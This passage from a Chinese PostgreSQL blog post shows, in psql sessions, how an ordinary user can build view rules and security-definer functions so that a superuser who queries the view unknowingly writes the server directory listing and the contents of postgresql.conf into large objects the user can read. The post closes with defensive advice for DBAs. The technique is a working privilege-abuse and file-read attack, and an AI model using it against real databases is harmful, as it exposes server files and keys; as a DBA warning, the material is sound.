 # are of the form:                                                    +  
 #                                                                     +  
 # MAPNAME  SYSTEM-USERNAME  PG-USERNAME                               +  
 #                                                                     +  
 # (The uppercase quantities must be replaced by actual values.)       +  
 #                                                                     +  
 # MAPNAME is the (otherwise freely chosen) map name that was used in  +  
 # pg_hba.conf.  SYSTEM-USERNAME is the detected user name of the      +  
 # client.  PG-USERNAME is the requested PostgreSQL user name.  The    +  
 # existence of a record specifies that SYSTEM-USERNAME may connect as +  
 # PG-USERNAME.                                                        +  
 #                                                                     +  
 # If SYSTEM-USERNAME starts with a slash (/), it will be treated as a +  
 # regular expression.  Optionally this can contain a capture (a       +  
 # parenthesized subexpression).  The substring matching the capture   +  
 # will be substituted for \1 (backslash-one) if present in            +  
 # PG-USERNAME.                                                        +  
 #                                                                     +  
 # Multiple maps may be specified in this file and used by pg_hba.conf.+  
 #                                                                     +  
 # No map names are defined in the default configuration.  If all      +  
 # system user names and PostgreSQL user names are the same, you don't +  
 # need anything in this file.                                         +  
 #                                                                     +  
 # This file is read on server startup and when the postmaster receives+  
 # a SIGHUP signal.  If you edit the file on a running system, you have+  
 # to SIGHUP the postmaster for the changes to take effect.  You can   +  
 # use "pg_ctl reload" to do that.                                     +  
                                                                       +  
 # Put your actual configuration here                                  +  
 # ----------------------------------                                  +  
                                                                       +  
 # MAPNAME       SYSTEM-USERNAME         PG-USERNAME                   +  
(1 row)  
```  
把这些内容写入普通用户的表，依旧只能使用直接调用的方法，所以以下方法hack不行。  
```  
postgres=> create table v2 (id int);  
CREATE TABLE  
postgres=> create table v3 (c1 text);  
CREATE TABLE  
postgres=> create rule "_RETURN" as on select to v2 do instead with t1 as (insert into v3 select pg_ls_dir('.') returning *) select 1 as id ;  
ERROR:  rules on SELECT must not contain data-modifying statements in WITH  
postgres=> create rule "_RETURN" as on select to v2 do instead insert into v3 select pg_ls_dir('.') returning * ;  
ERROR:  rules on SELECT must have action INSTEAD SELECT  
postgres=> create or replace function f1() returns void as $$  
postgres$> declare  
postgres$> begin  
postgres$>   insert into v3 select pg_ls_dir('.');  
postgres$> end;  
postgres$> $$ language plpgsql security definer;  
CREATE FUNCTION  
postgres=> create rule "_RETURN" as on select to v2 do instead select 1 as id from f1();  
CREATE RULE  
postgres=> \c postgres postgres  
You are now connected to database "postgres" as user "postgres".  
postgres=# select * from v2;  
ERROR:  must be superuser to get directory listings  
CONTEXT:  SQL statement "insert into v3 select pg_ls_dir('.')"  
PL/pgSQL function f1() line 4 at SQL statement  
```  
换种方法，用大对象操作，把数据搞进来。  
```  
postgres=> drop view v2;  
DROP VIEW  
postgres=> create table v2(id int);  
CREATE TABLE  
postgres=> select lo_create(1);  
 lo_create   
-----------  
         1  
(1 row)  
postgres=> create rule "_RETURN" as on select to v2 do instead select 1 as id from (select lowrite(lo_open(1,131072), con::bytea) from (select string_agg(c,'  |  ') as con from pg_ls_dir('.') as t(c)) t)t;;  
CREATE RULE  
postgres=> \c postgres postgres  
You are now connected to database "postgres" as user "postgres".  
postgres=# select * from v2;  
 id   
----  
  1  
(1 row)  
postgres=# \c postgres digoal  
postgres=> select convert_from(loread(lo_open(1,262144),1000),'utf8');  
                                                 convert_from                                                                                                                                                                                  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
--------------------------------------------------------------------------------------------------------------  
 pg_xlog  |  pg_multixact  |  base  |  .s.PGSQL.1922.lock  |  recovery.done  |  pg_log  |  pg_logical  |  pg_subtrans  |  backup_label.old  |  pg_stat_tmp  |  PG_VERSION  |  postmaster.opts  |  tsearch_data  |  pg_stat  |  pg_serial  |    
VITESSE_LICENSE_KEY  |  pg_notify  |  postgresql.conf  |  pg_replslot  |  pg_tblspc  |  pg_ident.conf  |  server.crt  |  pg_dynshmem  |  pg_twophase  |  global  |  server.key  |  .s.PGSQL.1922  |  .s.PGSQL.1921.lock  |  .s.PGSQL.1921  |   
 postmaster.pid  |  pg_hba.conf  |  pg_worker_list.conf  |  pg_clog  |  postgresql.auto.conf  |  pg_snapshots  
(1 row)  
```  
列出了文件列表，你可以把所有的文件都读进来。  
```  
postgres=> select lo_create(2);  
 lo_create   
-----------  
         2  
(1 row)  
postgres=> drop view v2;  
DROP VIEW  
postgres=> create table v2(id int);  
CREATE TABLE  
postgres=> create rule "_RETURN" as on select to v2 do instead select 1 as id from (select lowrite(lo_open(2,131072), pg_read_binary_file('postgresql.conf'))) t;  
CREATE RULE  
postgres=> \c postgres postgres  
You are now connected to database "postgres" as user "postgres".  
postgres=# select * from v2;  
 id   
----  
  1  
(1 row)  
postgres=# \c postgres digoal  
You are now connected to database "postgres" as user "digoal".  
postgres=> select convert_from(loread(lo_open(2,262144),100000),'utf8');  
                                                                                 convert_from                                                                                    
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
 # -----------------------------                                                                                                                                              +  
 # PostgreSQL configuration file                                                                                                                                              +  
 # -----------------------------                                                                                                                                              +  
 #                                                                                                                                                                            +  
 # This file consists of lines of the form:                                                                                                                                   +  
 #                                                                                                                                                                            +  
 #   name = value                                                                                                                                                             +  
 #                                                                                                                                                                            +  
 # (The "=" is optional.)  Whitespace may be used.  Comments are introduced with                                                                                              +  
 # "#" anywhere on a line.  The complete list of parameter names and allowed                                                                                                  +  
 # values can be found in the PostgreSQL documentation.                                                                                                                       +  
 #                                                                                                                                                                            +  
 # The commented-out settings shown in this file represent the default values.                                                                                                +  
 # Re-commenting a setting is NOT sufficient to revert it to the default value;                                                                                               +  
 # you need to reload the server.                                                                                                                                             +  
 #                                                                                                                                                                            +  
 # This file is read on server startup and when the server receives a SIGHUP                                                                                                  +  
 # signal.  If you edit the file on a running system, you have to SIGHUP the                                                                                                  +  
 # server for the changes to take effect, or use "pg_ctl reload".  Some                                                                                                       +  
 # parameters, which are marked below, require a server shutdown and restart to                                                                                               +  
......  
```  
审计超级用户是否查看了普通用的表的行为。  
```  
postgres=# \c postgres digoal  
You are now connected to database "postgres" as user "digoal".  
postgres=> drop view v2;  
DROP VIEW  
postgres=> \dt v2  
No matching relations found.  
postgres=> create table v2 (id int);  
CREATE TABLE  
postgres=> create table v3_audit(id serial primary key,r name,si inet,sp int,ci inet,cp int,ctime timestamp);  
CREATE TABLE  
postgres=> create or replace function f1() returns void as $$                                               
declare  
begin  
  insert into v3_audit(r,si,sp,ci,cp,ctime) select current_user,inet_server_addr(),inet_server_port(),inet_client_addr(),inet_client_port(),now();  
end;  
$$ language plpgsql security definer;  
CREATE FUNCTION  
postgres=> create rule "_RETURN" as on select to v2 do instead select 1 as id from f1();  
CREATE RULE  
postgres=> \c postgres postgres  
You are now connected to database "postgres" as user "postgres".  
postgres=# select * from v2;  
 id   
----  
  1  
(1 row)  
```  
超级用户的行为被审计了。  
```  
postgres=# select * from v3_audit;  
 id |   r    | si | sp | ci | cp |           ctime              
----+--------+----+----+----+----+----------------------------  
  1 | digoal |    |    |    |    | 2015-09-30 12:36:50.246797  
(1 row)  
```  
所以，请注意：  
超级用户千万不要轻易去对不知名的表，视图执行select,insert,update,delete,truncate操作。这些都存在反噬“陷阱”。  
更危险的是，如果你把系统表或者常用的管理表的创建规则会触发器的权限给普通用户了，那简直是惹火上身。  
因为很多程序都会去查询系统表。  
所以函数的security invoker权限是很危险的，让普通 用户创建这种函数，是在给DBA自己制造麻烦。  
如果是security definer则没有以上风险。  
如果超级用户确实有必要对普通用户的表或视图执行DML咋办呢？会不会因为看了本文害怕了？  
这里有点小技巧：  
1\. 先查看一下你的对象是否有陷阱。  
例如:  
```  
postgres=# \d+ t  
                          Table "public.t"  
 Column |  Type   | Modifiers | Storage | Stats target | Description   
--------+---------+-----------+---------+--------------+-------------  
 id     | integer |           | plain   |              |   
Triggers:  
    tg1 BEFORE INSERT ON t FOR EACH ROW EXECUTE PROCEDURE tg1()  
```  
发现陷阱。  
2\. 在事务中操作，万一有问题可以回滚。  
```  
begin;  
......  
rollback;  
```  
3\. 内核可以做点什么？ 禁止普通用户创建security definer的函数。  
## 参考  
1\. http://www.postgresql.org/docs/9.4/static/sql-createrule.html  
2\. http://www.postgresql.org/docs/9.4/static/sql-createfunction.html  
3\. http://blog.163.com/digoal@126/blog/static/16387704020156173121155/  
4\. http://blog.163.com/digoal@126/blog/static/16387704020130931040444/  
#### [PostgreSQL 许愿链接](https://github.com/digoal/blog/issues/76 "269ac3d1c492e938c0191101c7238216")
您的愿望将传达给PG kernel hacker、数据库厂商等, 帮助提高数据库产品质量和功能, 说不定下一个PG版本就有您提出的功能点. 针对非常好的提议，奖励限量版PG文化衫、纪念品、贴纸、PG热门书籍等，奖品丰富，快来许愿。[开不开森](https://github.com/digoal/blog/issues/76 "269ac3d1c492e938c0191101c7238216").  
#### [9.9元购买3个月阿里云RDS PostgreSQL实例](https://www.aliyun.com/database/postgresqlactivity "57258f76c37864c6e6d23383d05714ea")
#### [PostgreSQL 解决方案集合](https://yq.aliyun.com/topic/118 "40cff096e9ed7122c512b35d8561d9c8")
#### [德哥 / digoal's github - 公益是一辈子的事.](https://github.com/digoal/blog/blob/master/README.md "22709685feb7cab07d30f30387f0a9ae")
![digoal's wechat](../pic/digoal_weixin.jpg "f7ad92eeba24523fd47a6e1a0e691b59")
#### [PolarDB 学习图谱: 训练营、培训认证、在线互动实验、解决方案、生态合作、写心得拿奖品](https://www.aliyun.com/database/openpolardb/activity "8642f60e04ed0c814bf9cb9677976bd4")
#### [购买PolarDB云服务折扣活动进行中, 55元起](https://www.aliyun.com/activity/new/polardb-yunparter?userCode=bsb3t4al "e0495c413bedacabb75ff1e880be465a")
#### [About 德哥](https://github.com/digoal/blog/blob/master/me/readme.md "a37735981e7704886ffd590565582dd0")